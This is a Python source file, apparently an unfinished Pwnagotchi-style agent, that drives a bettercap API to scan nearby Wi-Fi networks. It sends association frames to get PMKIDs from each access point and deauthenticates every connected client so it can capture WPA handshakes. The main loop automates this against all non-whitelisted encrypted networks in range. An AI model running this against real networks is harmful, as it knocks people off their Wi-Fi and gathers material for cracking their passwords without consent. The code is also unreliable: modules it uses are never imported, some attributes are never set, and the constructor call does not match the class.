import os
import time
import tomlkit
import random
import logging
import asyncio
import threading
import subprocess
import requests
import websockets
import glob
import threading

import pwnisher

from time import sleep
from requests.auth import HTTPBasicAuth

import plugins





logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
)


logging.getLogger("requests").setLevel(logging.WARNING)

requests.adapters.DEFAULT_RETRIES = 5

ping_timeout = 180
ping_interval = 15
max_queue = 10000

min_sleep = 0.5
max_sleep = 5.0

RECOVERY_DATA_FILE = '/root/.pwnagotchi-recovery'


def decode(r, verbose_errors=True):
    try:
        return r.json()
    except Exception as e:
        if r.status_code == 200:
            logging.error("error while decoding json: error='%s' resp='%s'" % (e, r.text))
        else:
            err = "error %d: %s" % (r.status_code, r.text.strip())
            if verbose_errors:
                logging.info(err)
            raise Exception(err)
        return r.text


class Client:
    def __init__(self, hostname='localhost', scheme='http', port=8081, username='user', password='pass'):
        self.hostname = hostname
        self.scheme = scheme
        self.port = port
        self.username = username
        self.password = password
        self.url = f"{scheme}://{hostname}:{port}/api"
        self.websocket = f"ws://{username}:{password}@{hostname}:{port}/api"
        self.auth = HTTPBasicAuth(username, password)

        self._history = {}
        self._handshakes={}
        self._last_pwnd = None
        self.ping_interval = 20
        self.ping_timeout = 10
        self.max_queue = None
        self.min_sleep = 2
        self.max_sleep = 10

        self.aps={}



 
    #FUNZIONAVA PRIMA
    def sessions(self, sess="session"):

        r = requests.get(f"{self.url}/{sess}", auth=self.auth)
        return decode(r)
    
    #FUNZIONA IN PWNAGOTCHI
    def session(self, sess="session"):
        print("URL:",self.url)
        r = requests.get("%s/%s" % (self.url, sess), auth=self.auth)
        return decode(r)

    async def start_websocket(self, consumer):
        print("QUIIIIIIIIIIIIIIIII")

        s = f"{self.websocket}/events"
        while True:
            logging.error("QUIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII")
            logging.info("[bettercap] creating new websocket...")
            logging.info("[bettercap] connecting to %s", s)
            try:
                async with websockets.connect(
                    s,
                    ping_interval=self.ping_interval,
                    ping_timeout=self.ping_timeout,
                    max_queue=self.max_queue
                ) as ws:
                    while True:
                        try:
                            async for msg in ws:
                                try:
                                    await consumer(msg)
                                except Exception as ex:
                                    logging.debug("[bettercap] error while parsing event (%s)", ex)
                        except websockets.ConnectionClosedError:
                            try:
                                pong = await ws.ping()
                                await asyncio.wait_for(pong, timeout=ping_timeout)
                                logging.warning('[bettercap] ping OK, keeping connection alive...')
                                continue
                            except:
                                sleep_time = min_sleep + max_sleep * random.random()
                                logging.warning('[bettercap] ping error - retrying in %.1f sec', sleep_time)
                                await asyncio.sleep(sleep_time)
                                break
            except ConnectionRefusedError:
                sleep_time = min_sleep + max_sleep*random.random()
                logging.warning('[bettercap] nobody seems to be listening at the bettercap endpoint...')
                logging.warning('[bettercap] retrying connection in {} sec'.format(sleep_time))
                await asyncio.sleep(sleep_time)
                continue
            except OSError:
                logging.warning('connection to the bettercap endpoint failed...')
                pwnagotchi.restart("AUTO")

    def run(self, command, verbose_errors=True):
        while True:
            try:
                r = requests.post(f"{self.url}/session", auth=self.auth, json={'cmd': command})
            except requests.exceptions.ConnectionError:
                sleep_time = min_sleep + max_sleep * random.random()
                logging.warning("[bettercap] connection error, retrying run in %.1f sec", sleep_time)
                sleep(sleep_time)
            else:
                break
        return decode(r, verbose_errors=verbose_errors)
    


    def setup_events(self):
        logging.info("connecting to %s ...", self.url)

        for tag in self.config['bettercap']['silence']:
            try:
                print(self.config)
                self.run('events.ignore %s' % tag, verbose_errors=False)
            except Exception:
                pass

    def start_module(self, module):
        self.run(f'{module} on')

    def iface_channels(self, ifname):
        channels = []
        phy = subprocess.getoutput(f"/sbin/iw {ifname} info | grep wiphy | cut -d ' ' -f 2")
        output = subprocess.getoutput(f"/sbin/iw phy{phy} channels | grep ' MHz' | grep -v disabled | sed 's/^.*\\[//g' | sed s/\\].*\\$//g")
        for line in output.split("\n"):
            try:
                channels.append(int(line.strip()))
            except Exception:
                pass
        return channels

    def is_module_running(self, module):
        s = self.session()
        for m in s.get('modules', []):
            if m['name'] == module:
                return m['running']
        return False

    def restart_module(self, module):
        self.run(f'{module} off; {module} on')

    def get_config(self):
        return self.config

    def _reset_wifi_settings(self):
        cfg = self.get_config()
        mon_iface = cfg['main']['iface']
        self.run(f'set wifi.interface {mon_iface}')
        self.run(f'set wifi.ap.ttl {cfg["personality"]["ap_ttl"]}')
        self.run(f'set wifi.sta.ttl {cfg["personality"]["sta_ttl"]}')
        self.run(f'set wifi.rssi.min {cfg["personality"]["min_rssi"]}')
        self.run(f'set wifi.handshakes.file {cfg["bettercap"]["handshakes"]}')
        self.run('set wifi.handshakes.aggregate false')
        

    def start_monitor_mode(self):
        cfg = self.get_config()

        mon_iface = cfg["main"]['iface']
        mon_start_cmd = "startmon.sh"
        has_mon = False

        while not has_mon:
            s = self.session()
            for iface in s.get('interfaces', []):
                if iface['name'] == mon_iface:
                    logging.info("found monitor interface: %s", iface['name'])
                    has_mon = True
                    break

            if not has_mon:
                if mon_start_cmd:
                    logging.info("starting monitor interface ...")
                    subprocess.run(["bash", mon_start_cmd])
                else:
                    logging.info("waiting for monitor interface %s ...", mon_iface)
                    time.sleep(1)

        cfg = self.get_config()
        self._supported_channels = self.iface_channels(cfg['main']['iface'])
        logging.info("supported channels: %s", self._supported_channels)
        logging.info("handshakes will be collected inside %s", cfg['bettercap']['handshakes'])

        self._reset_wifi_settings() 

        if self.is_module_running('wifi'):
            logging.debug("restarting wifi module ...")
            self.restart_module('wifi.recon')
            self.run('wifi.clear')
        else:
            logging.debug("starting wifi module ...")
            self.start_module('wifi.recon')

    def total_unique_handshakes(self, path):
        expr = os.path.join(path, "*.pcap")
        return len(glob.glob(expr))

    def _update_handshakes(self, new_shakes=0):
        if new_shakes > 0:
            self._epoch.track(handshake=True, inc=new_shakes)

        cfg=self.get_config()
        tot = self.total_unique_handshakes(cfg['bettercap']['handshakes'])
        txt = '%d (%d)' % (len(self._handshakes), tot)

        if self._last_pwnd is not None:
            txt += ' [%s]' % self._last_pwnd

        #self._view.set('shakes', txt)

        #if new_shakes > 0:
        #    self._view.on_handshakes(new_shakes)
    
    async def _on_event(self, msg):
        found_handshake = False
        jmsg = json.loads(msg)
        logging.info("received event: %s" % jmsg)

        # give plugins access to the events
        try:
            plugins.on('bcap_%s' % re.sub(r"[^a-z0-9_]+", "_", jmsg['tag'].lower()), self, jmsg)
        except Exception as err:
            logging.error("Processing event: %s" % err)

        if jmsg['tag'] == 'wifi.client.handshake':
            filename = jmsg['data']['file']
            sta_mac = jmsg['data']['station']
            ap_mac = jmsg['data']['ap']
            key = "%s -> %s" % (sta_mac, ap_mac)
            if key not in self._handshakes:
                self._handshakes[key] = jmsg
                s = self.session()
                ap_and_station = self._find_ap_sta_in(sta_mac, ap_mac, s)
                if ap_and_station is None:
                    logging.warning("!!! captured new handshake: %s !!!", key)
                    self._last_pwnd = ap_mac
                    plugins.on('handshake', self, filename, ap_mac, sta_mac)
                else:
                    (ap, sta) = ap_and_station
                    self._last_pwnd = ap['hostname'] if ap['hostname'] != '' and ap[
                        'hostname'] != '<hidden>' else ap_mac
                    logging.warning(
                        "!!! captured new handshake on channel %d, %d dBm: %s (%s) -> %s [%s (%s)] !!!",
                        ap['channel'], ap['rssi'], sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'])
                    plugins.on('handshake', self, filename, ap, sta)
                found_handshake = True
            self._update_handshakes(1 if found_handshake else 0)


    def _load_recovery_data(self, delete=True, no_exceptions=True):
        try:
            with open(RECOVERY_DATA_FILE, 'rt') as fp:
                data = json.load(fp)
                logging.info("found recovery data: %s", data)
                self._started_at = data['started_at']
                self._epoch.epoch = data['epoch']
                self._handshakes = data['handshakes']
                self._history = data['history']
                self._last_pwnd = data['last_pwnd']

                if delete:
                    logging.info("deleting %s", RECOVERY_DATA_FILE)
                    os.unlink(RECOVERY_DATA_FILE)
        except:
            if not no_exceptions:
                raise
    def _event_poller(self, loop):
        self._load_recovery_data()
        self.run('events.clear')

        while True:
            logging.debug("[agent:_event_poller] polling events ...")
            try:
                loop.create_task(self.start_websocket(self._on_event))
                loop.run_forever()
                logging.debug("[agent:_event_poller] loop loop loop")
            except Exception as ex:
                logging.debug("[agent:_event_poller] Error while polling via websocket (%s)", ex)
    def start_event_polling(self):
        threading.Thread(
            target=self._event_poller,
            args=(asyncio.get_event_loop(),),
            name="Event Polling",
            daemon=True
        ).start()

    def recon(self):
        cfg = self.get_config()
        recon_time = cfg['personality']['recon_time']
        channels = cfg['personality']['channels']

        if not channels:
            self._current_channel = 0
            logging.debug("RECON %ds", recon_time)
            self.run('wifi.recon.channel clear')
        else:
            logging.debug("RECON %ds ON CHANNELS %s", recon_time, ','.join(map(str, channels)))
            try:
                self.run(f'wifi.recon.channel {",".join(map(str, channels))}')
            except Exception as e:
                logging.exception("Error setting wifi.recon.channels: %s", e)

    def _has_handshake(self, bssid):
        for key in self._handshakes:
            if bssid.lower() in key:
                return True
        return False

    def _should_interact(self, who):
        if self._has_handshake(who):
            return False

        elif who not in self._history:
            self._history[who] = 1
            return True

        else:
            self._history[who] += 1

        return self._history[who] < self.config['personality']['max_interactions']

    def set_access_points(self, aps):
        self._access_points = aps
        plugins.on('wifi_update', self, aps)
        #self._epoch.observe(aps, list(self._peers.values()))
        return self._access_points


    def get_access_points(self):
        whitelist = self.config['main']['whitelist']
        aps = []
        try:
            s = self.session()
            plugins.on("unfiltered_ap_list", self, s['wifi']['aps'])
            for ap in s['wifi']['aps']:
                if ap['encryption'] == '' or ap['encryption'] == 'OPEN':
                    continue
                elif ap['hostname'] in whitelist or ap['mac'][:13].lower() in whitelist or ap['mac'].lower() in whitelist:
                    continue
                else:
                    aps.append(ap)
        except Exception as e:
            logging.exception("Error while getting access points (%s)", e)

        aps.sort(key=lambda ap: ap['channel'])
        return self.set_access_points(aps)

    def get_access_points_by_channel(self):
        aps = self.get_access_points()
        channels = self.config['personality']['channels']
        grouped = {}

        # group by channel
        for ap in aps:
            logging.info("AP: %s (%s) on channel %d", ap['hostname'], ap['mac'], ap['channel'])
            self.aps[ap['mac']] = ap
            ch = ap['channel']
            # if we're sticking to a channel, skip anything
            # which is not on that channel
            if channels and ch not in channels:
                continue

            if ch not in grouped:
                grouped[ch] = [ap]
            else:
                grouped[ch].append(ap)

        # sort by more populated channels
        return sorted(grouped.items(), key=lambda kv: len(kv[1]), reverse=True)

    def set_channel(self, channel, verbose=True):
           # if self.is_stale():
           #     logging.debug("recon is stale, skipping set_channel(%d)", channel)
           #     return

            # if in the previous loop no client stations has been deauthenticated
            # and only association frames have been sent, we don't need to wait
            # very long before switching channel as we don't have to wait for
            # such client stations to reconnect in order to sniff the handshake.
            wait = 0
            #if self._epoch.did_deauth:
            #    wait = self.config['personality']['hop_recon_time']
            #elif self._epoch.did_associate:
            #    wait = self.config['personality']['min_recon_time']

            if channel != self._current_channel:
                if self._current_channel != 0 and wait > 0:
                    if verbose:
                        logging.info("waiting for %ds on channel %d ...", wait, self._current_channel)
                    else:
                        logging.debug("waiting for %ds on channel %d ...", wait, self._current_channel)
                    self.wait_for(wait)
                #if verbose and self._epoch.any_activity:
                #    logging.info("CHANNEL %d", channel)
                try:
                    self.run('wifi.recon.channel %d' % channel)
                    self._current_channel = channel
                    #self._epoch.track(hop=True)
                    #self._view.set('channel', '%d' % channel)

                    plugins.on('channel_hop', self, channel)

                except Exception as e:
                    logging.error("Error while setting channel (%s)", e)

    def associate(self, ap, throttle=-1):
       # if self.is_stale():
        #    logging.debug("recon is stale, skipping assoc(%s)", ap['mac'])
        #    return
        if throttle == -1 and "throttle_a" in self.config['personality']:
            throttle = self.config['personality']['throttle_a']

        if self.config['personality']['associate'] and self._should_interact(ap['mac']):
            #self._view.on_assoc(ap)

            try:
                logging.info("sending association frame to %s (%s %s) on channel %d [%d clients], %d dBm...",
                             ap['hostname'], ap['mac'], ap['vendor'], ap['channel'], len(ap['clients']), ap['rssi'])
                self.run('wifi.assoc %s' % ap['mac'])
               # self._epoch.track(assoc=True)
            except Exception as e:
                self._on_error(ap['mac'], e)

            plugins.on('association', self, ap)
            if throttle > 0:
                time.sleep(throttle)
            #self._view.on_normal()

    def start_session_fetcher(self):
        #_thread.start_new_thread(self._fetch_stats, ())
        threading.Thread(target=self._fetch_stats, args=(), name="Session Fetcher", daemon=True).start()

    def _fetch_stats(self):
        while True:
            try:
                s = self.session()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.session: %s" % repr(err))
            
            """
            try:
                self._update_uptime(s)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_uptimes: %s" % repr(err))

            try:
                self._update_advertisement(s)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_advertisements: %s" % repr(err))

            try:
                self._update_peers()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_peers: %s" % repr(err))
            try:
                self._update_counters()
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_counters: %s" % repr(err))
            """
            try:
                self._update_handshakes(0)
            except Exception as err:
                logging.error("[agent:_fetch_stats] self.update_handshakes: %s" % repr(err))

            time.sleep(5)

    def deauth(self, ap, sta, throttle=-1):
        #if self.is_stale():
        #    logging.debug("recon is stale, skipping deauth(%s)", sta['mac'])
        #    return

        if throttle == -1 and "throttle_d" in self.config['personality']:
            throttle = self.config['personality']['throttle_d']

        if self.config['personality']['deauth'] and self._should_interact(sta['mac']):
            #self._view.on_deauth(sta)

            try:
                logging.info("deauthing %s (%s) from %s (%s %s) on channel %d, %d dBm ...",
                             sta['mac'], sta['vendor'], ap['hostname'], ap['mac'], ap['vendor'], ap['channel'],
                             ap['rssi'])
                self.run('wifi.deauth %s' % sta['mac'])
                #self._epoch.track(deauth=True)
            except Exception as e:
                self._on_error(sta['mac'], e)

            plugins.on('deauthentication', self, ap, sta)
            if throttle > 0:
                time.sleep(throttle)
            #self._view.on_normal()

    def view_aps(self):
        return self.aps

def load_toml_file(filename):
    with open(filename) as fp:
        text = fp.read()
    if "[main]" in text:
        return tomlkit.loads(text)
    else:
        import toml
        print("Converting dotted toml:", filename)
        data = toml.loads(text)
        try:
            backup = filename + ".ORIG"
            os.rename(filename, backup)
            with open(filename, "w") as fp2:
                tomlkit.dump(data, fp2)
            print("Converted to new format. Original saved at", backup)
        except Exception as e:
            print("Unable to convert to new format:", e)
        return data

def try_view_ap(Client):
    aps = Client.view_aps()
    if not aps:
        print("No access points found.")
        return

    for ap in aps.values():
        print(f"AP: {ap['hostname']} ({ap['mac']}) on channel {ap['channel']}, RSSI: {ap['rssi']} dBm")
        for client in ap['clients']:
            print(f"  Client: {client['mac']} ({client['vendor']}), RSSI: {client['rssi']} dBm")





def start(args):
    config = load_toml_file(args.config)

    pwnisher.config=config

    logging.info("Loaded config: %s", config)

    print(plugins.__file__)
    plugins.load(config)

   

    hostname = config['bettercap'].get('hostname', '127.0.0.1')
    client= Client( config,
                        "127.0.0.1" if "hostname" not in config['bettercap'] else config['bettercap']['hostname'],
                        "http" if "scheme" not in config['bettercap'] else config['bettercap']['scheme'],
                        8081 if "port" not in config['bettercap'] else config['bettercap']['port'],
                        "user" if "username" not in config['bettercap'] else config['bettercap']['username'],
                        "pass" if "password" not in config['bettercap'] else config['bettercap']['password']
    )

    client.setup_events()
    logging.info("Client è di tipo: %s", type(client))
    #client.run("set events.stream false")
    #client.run("set events.logger false")


    

    client.session()

  
    client.start_monitor_mode()

    client.start_event_polling()
    client.start_session_fetcher()

    logging.info("Client è di tipo: %s", type(client))





    """
    while True:
        session = client.session("session/wifi")

        # Lista di Access Point
        for ap in session.get('aps', []):
            ssid = ap.get('ssid', '<hidden>')
            bssid = ap.get('bssid')
            rssi = ap.get('rssi')
            clients = ap.get('clients', [])
            print(f"[AP] SSID: {ssid}, BSSID: {bssid}, RSSI: {rssi}, Clients: {len(clients)}")

            # Lista di client associati
            for client in clients:
                mac = client.get('mac')
                rssi = client.get('rssi')
                print(f"    [Client] MAC: {mac}, RSSI: {rssi}")

        time.sleep(5)
    """

    
    while True:
            try:
                # recon on all channels
                client.recon()
                # get nearby access points grouped by channel
                channels = client.get_access_points_by_channel()


                # for each channel
                for ch, aps in channels:
                    time.sleep(1)
                    client.set_channel(ch)

                    #if not agent.is_stale() and agent.any_activity():
                    logging.info("%d access points on channel %d" % (len(aps), ch))

                    # for each ap on this channel
                    for ap in aps:
                        # send an association frame in order to get for a PMKID
                        client.associate(ap)
                        # deauth all client stations in order to get a full handshake
                        for sta in ap['clients']:
                            client.deauth(ap, sta)
                            time.sleep(1)  # delay to not trigger nexmon firmware bugs

                # An interesting effect of this:
                #
                # From Pwnagotchi's perspective, the more new access points
                # and / or client stations nearby, the longer one epoch of
                # its relative time will take ... basically, in Pwnagotchi's universe,
                # Wi-Fi electromagnetic fields affect time like gravitational fields
                # affect ours ... neat ^_^
                #agent.next_epoch()

                #if grid.is_connected():
                 #   plugins.on('internet_available', agent)

            except Exception as e:
                if str(e).find("wifi.interface not set") > 0:
                    logging.exception("main loop exception due to unavailable wifi device, likely programmatically disabled (%s)", e)
                    logging.info("sleeping 60 seconds then advancing to next epoch to allow for cleanup code to trigger")
                    time.sleep(60)
                    #agent.next_epoch()
                else:
                    logging.exception("main loop exception (%s)", e)
    